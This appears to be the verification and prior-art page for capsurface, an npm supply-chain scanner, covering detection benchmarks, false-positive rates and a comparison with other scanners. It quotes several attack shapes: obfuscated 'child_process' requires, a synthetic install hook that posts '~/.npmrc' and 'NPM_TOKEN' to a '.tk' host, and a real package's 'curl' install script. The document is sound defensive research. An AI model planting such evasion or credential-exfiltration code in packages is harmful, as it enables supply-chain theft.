# Verification and prior art

The full methodology behind the summary in the [README](../README.md): what was measured, against which corpora, and where capsurface sits among the tools that already exist.

## Verification

See `test/` (`npm test`) and CHANGELOG.md for what was found and
fixed while pressure-testing this against real installs instead of only
the bundled demo.

### Coverage and inventory hardening (2026-09-21)

Compared the scanner at `3cff46b` with the coverage/indicator/native-install
changes on the four local production trees below: 5,853 physical package
installs, including repeated names/versions across applications. Discovery
reported no errors or escaped links, and all package analyses completed
within the new resource budgets.

- 64 installs gained additional collected endpoints or env vars beyond the
  old 20/40 truncation limits. For example, `es-abstract@1.24.2` in
  uptime-kuma went from 20 to 4,332 literal endpoints. These include reference
  URLs, not necessarily runtime network destinations.
- One existing capability category changed: `unix-dgram@2.0.7` in outline
  now reports its implicit install command. Its shipped `binding.gyp` and
  lack of an explicit install/preinstall confirm npm's `node-gyp rebuild`
  default. This is a legitimate native build requiring an approval decision.
- No package gained or lost a risk flag. This is a before/after observation
  on these installed trees, not a claim of universal zero false positives
  or a new benchmark of upgrade-gate precision.

Regression tests exercise indicators after the old limits, bounded collection
with explicit incomplete status, I/O failures, stale/interrupted snapshots,
snapshot checksums, output path containment, native-install overrides, and
engine fingerprint portability. The existing demo still fails with exit 1.
Local validation used Node 26.8.1; the repository's CI matrix covers other
Node versions and operating systems and was not run remotely for this change.

The fingerprint changes with this engine update. Rescan and review the
baseline migration: newly collected indicators may have existed previously
but been absent from a truncated older manifest. Scan-time differences from
the corpus comparison are not a performance claim; old scans ran first and
new scans could benefit from filesystem caching.

### Instance matching and selective review

Nine comparison regressions cover upgrades borrowing another version's
permissions, physical duplicates at the same version, Windows paths,
relocated packages, pnpm ambiguity, equivalent surfaces, legacy baselines
and the CLI gate. Fifteen review/approval tests exercise selective writes,
stale and repeated IDs, concurrent approval locks, incomplete coverage,
engine changes, Markdown escaping and report-only output. The complete
local suite passes 244 tests; the bundled escalation demo still exits 1.

Matching is conservative when a predecessor cannot be established. This
stage does not claim a measured false-block rate on real upgrades and does
not infer pnpm lockfile dependency edges. The 5,853-install scan comparison
above measures detector changes from the preceding hardening stage.

### Earlier corpus measurements

Discovery coverage, tested against a real 462 MB / 12,398-file tree
(typescript, webpack, next.js, eslint, jest, and their transitive deps):
capsurface finds 428 installed packages versus 286 from naively listing
`node_modules`'s top-level directories. The other 142 are nested, scoped,
or symlinked installs an earlier version of this tool missed. Scan time
was 6.4s / 423 MB peak RSS for that tree, about 67 packages/s, measured
before the profiling work described in CHANGELOG.md; the current figure on
a 20,039-package corpus is 161 packages/s single threaded. A 118-package
install of popular libraries scans in well under a second.

False-positive rate, same 118-package real corpus, before and after the
fixes in CHANGELOG.md:

| | CRITICAL flags | MEDIUM flags | aggregate risk score |
|---|---|---|---|
| Before | 2 (`glob`, `axios`, both false) | 14 | 326 |
| After | 0 | 7 | 148 |

None of the 118 packages are malicious, so zero CRITICAL is correct. The
two prior flags were confirmed false positives.

True-positive detection: the bundled Shai-Hulud-style escalation fixture
(`examples/run-demo.sh`) still fails the CI gate with the exact capability
diff. Regression fixtures cover a malicious `postinstall` hidden in a
nested `node_modules`, the same hidden behind a symlink, and a version
bump that adds only an obfuscated payload with no literal token for the
regex to match, three cases that previously slipped through.

### Against a corpus of evasion techniques

Every fixture reaches `child_process`; each tool is asked the same question,
does it say so. Techniques taken from the npm malicious-package benchmark
(arXiv 2603.27549) and the JavaScript deobfuscation survey (arXiv 2512.14070).

| technique | capsurface | js-x-ray 8.2 | wormguard 1.0.3 |
|---|---|---|---|
| `require('child_process')` | yes | yes | yes |
| `node:` prefix | yes | yes | yes |
| template literal | yes | no | yes |
| space before the paren | yes | yes | yes |
| multi-line require | yes | yes | yes |
| `'child' + '_process'` | yes | yes | yes |
| through a variable | yes | yes | no |
| hex escape | yes | yes | yes |
| unicode escape | yes | yes | yes |
| `String.fromCharCode` | yes | no | no |
| array join | yes | no | no |
| reversed string | yes | no | no |
| `Buffer.from(..., 'base64')` | yes | no | no |
| `Buffer.from(..., 'hex')` | yes | yes | no |
| | **14/14** | **9/14** | **8/14** |

Most of those are folded by `lib/normalize.js`, which is source rewriting
rather than parsing: each fold only fires when every input is a literal,
which is the case a parser would resolve anyway and the case an attacker gets
for free by typing a `+`. A specifier on its own line is reached by a
whole-file pass, run only over the categories the per-line pass left absent.

Together they cost about 1.4x scan time and changed no capability on 202 real
packages, because nothing legitimate writes
`require(Buffer.from('Y2hpbGRfcHJvY2Vzcw==', 'base64').toString())`.

What is still out of reach is in the corpus too, asserted as a miss: a
specifier whose value only exists once the program runs, like
`require(process.env.MOD)` or a name built in a loop. Those are reported
rather than resolved, see `unresolvedRequire`.

### On real production applications

Four open-source applications installed and scanned as they ship, not
libraries: uptime-kuma, documenso, outline, nocodb. 5,853 installed packages.

| app | packages | run at install | CRITICAL | HIGH |
|---|---|---|---|---|
| uptime-kuma | 1,235 | 14 (1.1%) | 0 | 6 |
| documenso | 2,049 | 15 (0.7%) | 1 | 14 |
| outline | 2,013 | 8 (0.4%) | 0 | 6 |
| nocodb | 556 | 1 (0.2%) | 1 | 2 |

Both CRITICALs are true positives and both are legitimate: documenso's
`prisma` runs a `preinstall`, talks to the network and reads `~/.npmrc` to
fetch its engine binaries; nocodb's `nx` runs a `postinstall`, talks to the
network and reads `GITHUB_TOKEN`. Neither is malware. Both are exactly the
allowlist decision npm 12 now forces, surfaced as two lines to review out of
5,853 packages rather than left for someone to find.

Then the end-to-end test, with a synthetic compromise rather than a real one
(no real malware is ever fetched here). A quiet transitive dependency of
uptime-kuma, `abort-controller`, was tampered in place the way Shai-Hulud V2
does it: a `preinstall` was added, pointing at an obfuscated payload that
builds its module names out of `Buffer.from('...', 'hex')` and
`String.fromCharCode`, reads `~/.npmrc` and `NPM_TOKEN`, and POSTs them to a
`.tk` host. The gate caught every layer:

```
abort-controller 3.0.0 -> 3.0.0  (delta +30)
  capability-added: Filesystem access, Network access, Process execution,
                    Sensitive credential/file targeting
  lifecycle-script-changed: (none) -> "node dist/bundle.js"
  new-network-endpoints: new host: npm-registry-cache.tk
  new-env-vars: NPM_TOKEN
  CRITICAL: install-time script + network + credential (worm pattern)
```

The obfuscated `require(Buffer.from('6368...','hex').toString())` resolved to
`child_process` because of the fold pass, so process execution showed up
rather than nothing. The version never changed, and it was still caught,
because the diff compares content, not version strings.

### Discovery, against real installs from each package manager

The layouts differ enough to be worth checking separately rather than
against a fixture. Same dependency set where possible, each installed for
real, each compared against a walk that counts every directory holding a
package.json with a name and a version.

| | packages found | walk counts | difference |
|---|---|---|---|
| npm 11, hoisted | 666 | 716 | 50 |
| pnpm 12, symlinked `.pnpm` store | 222 | 227 | 5 |
| Yarn Berry 4.18, `nodeLinker: node-modules` | 202 | 208 | 5 |
| npm workspaces monorepo | 138 | 138 | 0 |

Every difference is the walk over-counting, not discovery missing anything:
they are `lib/cjs/package.json` type stubs, vendored copies, benchmark
directories and test fixtures like `pino/test/fixtures/transport`. None is
an installed package, and their source is still read as part of the package
that ships them.

The monorepo case is the one worth calling out. npm symlinks each workspace
member from `node_modules/@scope/name` to `../../packages/name`, which
resolves outside `node_modules` entirely. All three members are found, with
`installPath` recording where they really live.

### Against 20,039 packages sampled across the registry

Reading dependency trees tells you the population this runs on. It does not
tell you what the rules are wrong about, because a tree is mostly popular,
well-behaved packages. So the sample is stratified across the registry
itself: the dependency closure of 245 well-known seeds, a uniform random
draw from all 4,431,335 published names, scoped packages, recent publishes
from the changes feed, and packages found by searching for native and
install-script tooling. 22,696 tarballs fetched, 20,039 with source, 0 scan
errors.

Every evidence entry records the rule that produced it, so rules can be
judged by what they match at scale rather than one finding at a time.
Eleven were wrong; see CHANGELOG.md for each one and the measured effect of
fixing it. Two are worth repeating here because they are blind spots rather
than noise:

**Lifecycle script commands were never scanned.** The command runs at
install time but lives in package.json, so walking the package never
reached it. That hid `xhjxhjtestrce123`, whose `preinstall` and
`postinstall` both run `curl http://<host>/?host=...` and whose manifest
reported no network access at all, and `iso-process`, whose postinstall
inlines `require('child_process').execSync('npm i', {cwd: join('..',
'esm')})`.

**Files a package ships in `bin` were never read.** They carry no extension
because the shell runs them through their shebang, and 502 of the 4,502
packages that ship an executable, 11.2%, point `bin` at a file an
extension-based filter skips. That file is the code a consumer runs
directly. Reading it gave 26 of a 158-package sample a capability the
manifest had missed; for four of them, `turbo` included, no file had been
read at all and the reported risk score was 0.

That second one also exposed a reporting problem worth naming: "nothing was
read" and "nothing was found" produced the same empty manifest, and 12.5%
of the sample reads that way. The manifest now says which it is.

What the sample says about npm itself: 469 of 20,039 packages run something
at install time, 2.3%. 185 run a JavaScript file, 111 are node-gyp or
prebuild, 21 inline code with `node -e`, 8 only print a message, and
exactly one pipes a download into a shell. 8 are CRITICAL and 231 HIGH.

That last number moved late. The CRITICAL flag claims a package matches the
self-propagating worm pattern, and it was firing 37 times, 29 of them on
agent and MCP command-line tools that run a postinstall, talk to the network
and read their own service key. It was telling figma-image-exporter, a Figma
CLI reading FIGMA_TOKEN, that it looked like Shai-Hulud. A worm propagates
on credentials belonging to the environment it lands in, so that is what the
flag requires now; the other 29 are still reported one severity down. Being
wrong in the highest-severity output is the most expensive place to be
wrong.

Throughput on that corpus: 161 packages/s single threaded, 37.5s for all
20,039, after the profiling work in CHANGELOG.md. Every optimisation was
verified by re-scanning the corpus and checking all 20,039 manifests are
identical to the character.

### Does it survive a real dependency upgrade

The thing that kills a CI security gate is not missed detections, it is
false alarms on routine work. Tested by installing 14 popular packages at
versions roughly two years old (express, lodash, axios, chalk, commander,
dotenv, debug, semver, glob, uuid, ws, node-fetch, yargs, dayjs),
baselining them, then upgrading all of them to current (npm reported 25
added, 27 removed, 49 changed):

| | escalations on that upgrade |
|---|---|
| Before this was tuned | 16 |
| After | 0 |

All 16 were routine library evolution: build-tooling swaps in `prepare`
scripts (tshy, husky, lefthook), new support for `NO_COLOR` and `no_proxy`,
and documentation URLs in error messages counted as new network endpoints.
Zero were security relevant. A gate that fires 16 times on an ordinary
upgrade gets switched off in a week, so those classes are now reported
without failing the build, while the signals that mark an actual attack
path still fail it. The bundled worm fixture and every detection regression
test still fail the gate exactly as before.

That test is now a standing one, widened so it cannot be tuned against:
82 popular packages, each at its last release before 2024-09-01, diffed
against its current release. Two years and, for many of them, a major
version apart.

| | escalations of 81 |
|---|---|
| Before the registry-scale campaign below | 5 |
| After its false-positive fixes | 3 |
| After its `node:` fix | 6 |
| After reporting unresolvable module names | 8 |

The two that went away were both the gate misreading generated code:
`zod` 3 to 4 on a long IPv6 regex literal, `vite` 5 to 8 on the string
`".npmrc"` inside a bundled list of config filenames.

Then the number went up, because the scanner started seeing things it had
been blind to. `nanoid` 6 added a CLI that reads files with
`import { readFileSync } from 'node:fs'` and `vitest` spawns processes with
`node:child_process`; neither was visible before. A capability a dependency
did not have two years ago is what this is supposed to raise once.

The last three are packages that began loading a module whose name is not in
the source. `svelte` 5 does `(module_name) => import(module_name)` from a
variable it calls `obfuscated_import`, `sass` inlines a `parcel_watcher`
loader, and `sinon` ships a UMD interop shim, `typeof require === "function"
? require(m) : ...`. The last of those is the known noise shape: nothing
about sinon changed, its bundler did. Kept anyway, because a dependency that
starts loading something it cannot name is the shape a compromised release
takes, and one glance per major version is proportionate.

Teams upgrade one release at a time, so that is measured too: every fifth
release of the same packages since 2024, diffed against the one before it.
396 upgrades, 19 escalations, 4.8%. One in twenty asks for a glance, and
they are worth it, `prettier` 3.7 really did add a `fetch` call to its
experimental CLI.

### On a realistic production tree

A 215-package service (express, pg, ioredis, jsonwebtoken, bcrypt, pino,
helmet, zod, prom-client, the AWS S3 SDK, stripe) scans in 1.6s and reports
this first:

```
Runs code at install time: 1 of 215
  bcrypt@5.1.1  risk=4
      install: node-pre-gyp install --fallback-to-build
```

That is the entire install-time execution surface of the tree, which is the
number that decides blast radius. It is also why the install-time list
prints before the risk ranking: bcrypt scores 4, because its own source
touches nothing else, and sorted below twenty higher-scoring packages that
cannot execute during install at all.

### Benchmark against GuardDog

Same 119-package corpus and the same bundled fixture, run locally with
GuardDog's dynamic sandbox and registry-metadata rules disabled (no kernel
sandbox available in this environment, and the fixture was never
published so it has no registry metadata).

Speed: `capsurface scan-tree` scans the full corpus in 0.95s (median of 3
runs). GuardDog has no bulk/tree mode, so checking the same corpus is one
process per package: 45.4s for 119 packages, about 47x slower, mostly
Python and rule-engine startup cost paid per package.

False-positive rate: parity. GuardDog rated 116/119 packages
`no_risks_detected` and the rest `low`, matching capsurface's zero
CRITICAL on the same corpus.

Detection of the bundled fixture is the interesting result. GuardDog
correctly detected every individual signal, the `.ssh/id_rsa` and
`.npmrc` reads, the `NPM_TOKEN`/`GITHUB_TOKEN` env reads, the HTTPS
beacon, but its aggregate `risk_score` labeled the fixture `low` (4.9/10),
discounting it as unsophisticated. Reading its rule source explains why:
`threat-npm-preinstall-script.yar` matches only the literal string
`"preinstall"`, never `"postinstall"` or `"install"`, so it never fires on
this fixture. Its broader `threat-process-hooks` rule covers postinstall
but only fires when a raw shell command is inlined directly in
package.json. The common real-world shape, `"postinstall": "node
./scripts/setup.js"` with the payload one file away, is not covered by
either rule. `postinstall` is not a hypothetical here: it is what the
original Shai-Hulud campaign used and one of two vectors the keyv/cacheable
worm used. This is a fair result under the specific conditions tested, not
a claim that GuardDog is weak in general; its full configuration (dynamic
sandbox, registry metadata, a broader rule set than capsurface's six
categories) was not evaluated. It does show that capsurface's uniform
treatment of `preinstall`/`install`/`postinstall` as equally
install-triggering closes a gap that a more general tool's rule set, as
configured and run here, did not.

## Prior art

Where capsurface sits among the tools that already exist.

| | Detection basis | Timing model | Scope | Deps | Deployment |
|---|---|---|---|---|---|
| Socket | Behavioural analysis, registry-wide monitoring, threat intel | Proactive, ecosystem-wide, can flag a compromised publish within minutes | whole package | n/a | Hosted SaaS |
| Semgrep Supply Chain | Lookup against 80,000+ known-malicious packages | Reactive, needs the package already in the database | whole package | n/a | Hosted SaaS |
| GuardDog 3.2 (Datadog) | YARA rules correlating a capability with a threat indicator, plus an optional kernel sandbox and registry-metadata rules | Point-in-time, one version in isolation, no bulk or tree mode | whole package | Python + yara-python, pygit2 | OSS CLI, local |
| js-x-ray 8.2 (NodeSecure) | AST with a variable tracer and constant folding | Point-in-time, per file | whole package | several | OSS library |
| wormguard 1.0.3 | AST with taint approximation, IoC corpus, script hashes, sigstore provenance | Delta-based on inventory and script hashes | install scripts | 7 | OSS CLI, local |
| capsurface | Source-text rules over folded literals | Delta-based on capability surface, relative to a reviewed baseline | whole package | none | OSS CLI, local, offline |

Two things are still solved better elsewhere and this does not compete on
either. Socket's real-time monitoring and Semgrep's malicious-package
database catch a compromised publish before `npm install` ever runs, and
correlate against maintainer behaviour and typosquatting, which a static
offline tool cannot. Dynamic sandboxing beats static analysis on obfuscated
payloads, which is why the OpenSSF's own
[Package Analysis](https://github.com/ossf/package-analysis) runs packages in
gVisor. GuardDog's sandbox and registry-metadata rules were not evaluated
here.

Where it does compete, measured rather than asserted:

**Detection depth**, on the evasion corpus above: capsurface 14/14, js-x-ray
9/14, wormguard 8/14, GuardDog 3/14. GuardDog reaches 5/14 with two pending
patches for the `node:` prefix and template-literal specifiers.

**Scope.** The same payload, reading `~/.npmrc` and `NPM_TOKEN` and POSTing
them out, placed in a package with and without an install script:

| | with an install script | without one |
|---|---|---|
| capsurface | CRITICAL, HIGH | HIGH |
| wormguard | 5 findings | nothing |
| npm-script-lens | reviewable | "no risky install-time behavior" |

Neither is wrong; both are scoped to install scripts and report nothing when
there is no install script. That scope is the difference, and the second
column is the event-stream shape, where the payload ran on `require()`.

**Speed**, same 203-package tree, median of three: capsurface 0.66s, wormguard
0.49s. wormguard is faster and reads far less, since it only analyses install
script entry points. GuardDog has no bulk mode at all; on a 119-package
corpus it was about 47x slower, mostly process startup paid per package.

Two things are already solved better elsewhere, and capsurface does not
compete on either. Socket's real-time monitoring and Semgrep's
malicious-package database do things a static, offline, zero-dependency
tool cannot: catch a compromised publish before `npm install` ever runs,
correlate against maintainer behavior and typosquatting, and cover more
ecosystems than the six categories here. Static analysis is also weaker
than dynamic sandboxed analysis for obfuscated payloads, which is why the
OpenSSF's own [Package Analysis](https://github.com/ossf/package-analysis)
project runs packages in gVisor instead of only reading source. GuardDog
and Semgrep share this limitation for their source-only heuristics too.

What capsurface bets on instead is the timing model. GuardDog and most
point-in-time scanners answer "is this version risky in isolation," so a
package that legitimately has network and env access, which is most
packages, re-triggers the same warning on every scan forever unless the
tool keeps its own allowlist. capsurface answers "did this update add a
capability that was not in the version we already reviewed," the same
question `git diff` answers for code, applied to capability surface. The
unit of trust is a plain JSON file committed next to `package-lock.json`
and reviewed in PRs, not a hosted API or a score you cannot inspect. It is
not a replacement for Socket or Semgrep. It is a cheap first gate that
does not require a SaaS relationship to exist at all.

On August 4 2026, the `keyv`/`cacheable` npm namespaces (2,234 poisoned
versions across 444 packages) were compromised through a hijacked
maintainer account. The payload was a `preinstall` hook that downloaded a
standalone Bun runtime and ran an obfuscated second-stage payload
harvesting credentials, [reported by Socket, Wiz, Datadog, and
Snyk](https://socket.dev/blog/popular-npm-packages-in-the-keyv-and-cacheable-namespaces-compromised-in-active-supply-chain).
capsurface cannot see what the downloaded runtime does, same blind spot as
below, but does not need to: a `preinstall` script combined with new
network access is exactly the CRITICAL combination this tool flags, on the
first scan of the compromised version, using only what is already
implemented. It is also a second real-world confirmation, after Shai-Hulud
V1 to V2, that `preinstall` and not just `postinstall` is where these
attacks land (see CHANGELOG.md). The same report describes a vector this
tool has no coverage for: malicious VS Code and Claude Code hook files
committed straight into the source tree, executing on folder-open with no
`npm install` involved. It is a real limitation, not ignored.
